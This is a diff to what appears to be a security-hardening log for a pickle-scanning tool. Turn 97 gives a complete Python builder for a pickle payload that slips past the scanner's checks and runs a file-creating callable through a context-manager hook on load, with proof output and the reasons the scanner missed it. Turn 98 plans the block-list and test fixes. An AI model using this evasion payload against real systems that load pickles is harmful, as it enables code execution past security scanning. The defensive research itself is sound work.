@@ -4951,3 +4951,136 @@ Blocking plan:
 
 Performance note: four literals in the existing magic-method match arm, no
 unary-operator flow modeling.
+
+## Turn 97 - Context-manager entry method gap
+
+Candidate payload:
+
+- Create a runtime subclass with `builtins.type`.
+- Use `pathlib.PosixPath` as the base class so instances are valid filesystem
+  paths.
+- Install `pathlib.Path.touch` as `__enter__` and `__exit__`.
+- Instantiate `contextlib.ExitStack()` and the path subclass for a marker path.
+- Call the currently clean `contextlib.ExitStack.enter_context(stack, cm)`
+  during unpickling.
+
+Representative protocol 4 payload builder:
+
+```python
+from pathlib import Path
+
+
+def s(data: bytes) -> bytes:
+    if len(data) <= 0xFF:
+        return b"\x8c" + bytes([len(data)]) + data
+    return b"X" + len(data).to_bytes(4, "little") + data
+
+
+def text(value: str) -> bytes:
+    data = value.encode()
+    return b"U" + bytes([len(data)]) + data
+
+
+def sg(module: bytes, name: bytes) -> bytes:
+    return s(module) + s(name) + b"\x93"
+
+
+marker = Path("/tmp/ma_contextlib_enter_context_dunder_enter_marker")
+payload = b"".join(
+    [
+        b"\x80\x04",
+        sg(b"builtins", b"type"),
+        b"(",
+        text("DerivedPath"),
+        sg(b"pathlib", b"PosixPath"),
+        b"\x85",
+        b"}",
+        text("__enter__"),
+        sg(b"pathlib", b"Path.touch"),
+        b"s",
+        text("__exit__"),
+        sg(b"pathlib", b"Path.touch"),
+        b"s",
+        b"tR\x940",
+        sg(b"contextlib", b"ExitStack"),
+        b")R\x940",
+        b"h\x00",
+        text(str(marker)),
+        b"\x85R\x940",
+        sg(b"contextlib", b"ExitStack.enter_context"),
+        b"h\x01h\x02\x86R.",
+    ]
+)
+```
+
+Proof on CPython 3.12.12:
+
+- Control scanner result: `len=218`, `status=complete`, `verdict=clean`,
+  `is_clean=True`, `findings=[]`, `notices=[]`
+- RCE scanner result: `len=260`, `status=complete`, `verdict=clean`,
+  `is_clean=True`, `findings=[]`, `notices=[]`
+- Coverage for the RCE payload: `bytes_scanned=260`, `bytes_total=260`,
+  `opcode_count=46`, `raw_scan_complete=True`, `opcode_scan_complete=True`
+- Scanner import references: `builtins.type`, `pathlib.PosixPath`,
+  `pathlib.Path.touch`, `contextlib.ExitStack`, and
+  `contextlib.ExitStack.enter_context`, all with `is_dangerous=False`
+- Control proof: the same pickle without the final `enter_context` call
+  returns a `DerivedPath` instance at
+  `/tmp/ma_contextlib_enter_context_dunder_enter_marker` and does not create
+  the marker
+- Unpickle result: the full payload returns `None` and creates
+  `/tmp/ma_contextlib_enter_context_dunder_enter_marker` with mode `0o644`
+
+RCE mechanism:
+
+- `type(...)` builds a `pathlib.PosixPath` subclass with attacker-controlled
+  context-manager slots.
+- `contextlib.ExitStack.enter_context(stack, cm)` resolves
+  `type(cm).__enter__` and `type(cm).__exit__`, then calls `__enter__(cm)`.
+- Because `__enter__` points at `Path.touch`, CPython calls
+  `Path.touch(cm)`, creating the marker path before returning normally.
+- `ExitStack` records the attacker-controlled `__exit__` method but does not
+  need to call it for this proof; the entry hook alone is enough for execution.
+
+Why the scanner missed it:
+
+- Generic context-manager slots `__enter__` and `__exit__` are absent from the
+  suspicious magic-method string list.
+- `contextlib.ExitStack.enter_context` is absent from `DANGEROUS_GLOBALS`;
+  earlier coverage blocks `ExitStack.callback`, `ExitStack.close`, and
+  `ExitStack.__exit__`, but not entry dispatch.
+- `builtins.type` and `pathlib.Path.touch` are clean; `pathlib` is not a
+  wildcard-dangerous module.
+- The dangerous callable is hidden as a synthesized context-manager hook, so
+  the visible call target is a standard-library context helper rather than the
+  attacker-selected callable.
+
+Performance note: the next focused block can add `__enter__` and `__exit__` to
+the existing suspicious magic-method string list, and optionally add
+`contextlib.ExitStack.enter_context` as a direct dangerous global. The string
+seed costs two additional literals in the existing hot path and covers other
+context-manager dispatchers without modeling `with` semantics.
+
+## Turn 98 - Block context-manager entry seeds
+
+Blocking plan:
+
+- Add `__enter__` and `__exit__` to the existing suspicious magic-method string
+  list. These hooks can route execution through standard context-manager entry
+  dispatch without an explicit attacker-selected call target.
+- Add `("contextlib", "ExitStack.enter_context")` to the sorted Rust
+  `DANGEROUS_GLOBALS` table. `enter_context` immediately invokes
+  `type(cm).__enter__(cm)`, so a pickle call to it is an active callback
+  dispatcher.
+- Keep `contextlib.ExitStack` itself, `builtins.type`, `pathlib.PosixPath`, and
+  `pathlib.Path.touch` allowed. The focused signals are the context-manager
+  dunder seeds plus the active `enter_context` dispatcher.
+- Add a CPython oracle regression that verifies the construction-only
+  `type(..., {"__enter__": Path.touch, "__exit__": Path.touch})` control is
+  suspicious and side-effect free, then verifies the active
+  `ExitStack.enter_context(stack, cm)` variant is malicious and creates its
+  marker during `pickle.loads()`.
+- Add a changelog entry under `[Unreleased]`.
+
+Performance note: two more literals in the existing magic-method matcher and
+one sorted global lookup entry; no context-manager flow modeling.
